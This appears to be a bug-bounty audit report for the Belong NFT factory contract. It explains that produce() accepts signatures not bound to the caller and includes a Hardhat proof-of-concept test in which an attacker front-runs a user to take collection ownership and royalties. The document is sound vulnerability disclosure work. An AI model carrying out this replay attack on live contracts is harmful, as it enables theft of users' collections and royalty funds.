# 57724 sc medium universal signature for produce allows front running and collection hijack

**Submitted on Oct 28th 2025 at 13:43:46 UTC by @auditagent for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57724
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

## Description

### Brief / Intro

The `produce()` function in `Factory.sol` is vulnerable to front-running because the signature verification does not include the intended caller's address (`msg.sender`). An attacker observing a pending collection deployment in the mempool can extract the signed parameters and replay them to steal ownership of the collection and its royalty streams.

### Vulnerability Details

In `Factory.sol`, the `produce()` function validates collection creation using `SignatureVerifier.checkAccessTokenInfo()`:

```solidity
function produce(AccessTokenInfo memory accessTokenInfo, bytes32 referralCode)
    external
    returns (address nftAddress)
{
    FactoryParameters memory factoryParameters = _nftFactoryParameters;

    factoryParameters.signerAddress.checkAccessTokenInfo(accessTokenInfo);
    ...
}
```

`SignatureVerifier.checkAccessTokenInfo()` verifies a signature over metadata fields but excludes the intended creator (`msg.sender`):

```solidity
function checkAccessTokenInfo(address signer, AccessTokenInfo memory accessTokenInfo) external view {
    require(
        bytes(accessTokenInfo.metadata.name).length > 0 && bytes(accessTokenInfo.metadata.symbol).length > 0,
        EmptyMetadata(accessTokenInfo.metadata.name, accessTokenInfo.metadata.symbol)
    );

    require(
        signer.isValidSignatureNow(
            keccak256(
                abi.encodePacked(
                    accessTokenInfo.metadata.name,
                    accessTokenInfo.metadata.symbol,
                    accessTokenInfo.contractURI,
                    accessTokenInfo.feeNumerator,
                    block.chainid
                )
            ),
            accessTokenInfo.signature
        ),
        InvalidSignature()
    );
}
```

The signed payload includes `name`, `symbol`, `contractURI`, `feeNumerator`, and `chainid`, but NOT `msg.sender` or any caller-specific identifier.

### Impact Details

* Attacker can become the owner/creator of the collection.
* The victim's transaction will later revert with `TokenAlreadyExists()` when they attempt to submit it.

## References

* <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol#L230>
* <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol#L53>

## Proof of Concept

<details>

<summary>Test that demonstrates front-running and collection hijack (expand to view)</summary>

Command to run the test:

```bash
npx hardhat test test/v2/platform/factory.test.ts --grep "attacker can front-run and steal collection"
```

Test code to add in `test/v2/platform/factory.test.ts`:

```typescript
it('attacker can front-run and steal collection ownership', async () => {
  const { factory, alice, bob, signer } = await loadFixture(fixture);

  // Alice (legitimate user)
  const nftName = 'Alice Collection';
  const nftSymbol = 'ALICE';
  const contractURI = 'contractURI/AliceCollection';
  const price = ethers.utils.parseEther('0.01');
  const feeNumerator = 500;

  // Backend creates signature for the collection metadata (NOT bound to Alice's address)
  const message = hashAccessTokenInfo(nftName, nftSymbol, contractURI, feeNumerator, chainId);
  const signature = EthCrypto.sign(signer.privateKey, message);

  // Alice prepares her transaction
  const aliceInfo: AccessTokenInfoStruct = {
    metadata: { name: nftName, symbol: nftSymbol },
    contractURI: contractURI,
    paymentToken: NATIVE_CURRENCY_ADDRESS,
    mintPrice: price,
    whitelistMintPrice: price,
    transferable: true,
    maxTotalSupply: BigNumber.from('1000'),
    feeNumerator: feeNumerator,
    collectionExpire: BigNumber.from('86400'),
    signature: signature,
  };

  // Bob (attacker) monitors mempool and sees Alice's pending transaction
  // Bob extracts the AccessTokenInfo and signature from Alice's transaction
  // Bob front-runs Alice by submitting the same transaction with higher gas
  const txBob = await factory.connect(bob).produce(aliceInfo, ethers.constants.HashZero);
  await expect(txBob).to.emit(factory, 'AccessTokenCreated');

  // Bob's transaction succeeds and he becomes the creator!
  const nftInstanceInfo = await factory.nftInstanceInfo(nftName, nftSymbol);
  expect(nftInstanceInfo.creator).to.be.equal(bob.address); // Bob is the creator, not Alice!

  const nft = await ethers.getContractAt('AccessToken', nftInstanceInfo.nftAddress);
  const [, creator, feeReceiver] = await nft.parameters();
  expect(creator).to.be.equal(bob.address); // Bob owns the collection

  // Verify Bob receives royalties through RoyaltiesReceiver
  const RoyaltiesReceiverV2: RoyaltiesReceiverV2 = await ethers.getContractAt('RoyaltiesReceiverV2', feeReceiver);
  const payees: RoyaltiesReceiverV2.RoyaltiesReceiversStruct = await RoyaltiesReceiverV2.royaltiesReceivers();
  expect(payees.creator).to.eq(bob.address); // Bob will receive creator royalties

  // Alice's transaction now fails because the collection already exists
  await expect(factory.connect(alice).produce(aliceInfo, ethers.constants.HashZero)).to.be.revertedWithCustomError(
    factory,
    'TokenAlreadyExists',
  );

  console.log('Expected creator (Alice):', alice.address);
  console.log("Bob address:", bob.address);
  console.log('Actual creator (Bob - attacker):', creator);
  console.log("Royalty will be received by: ",payees.creator)
  console.log('Collection address:', nftInstanceInfo.nftAddress);
});
```

</details>
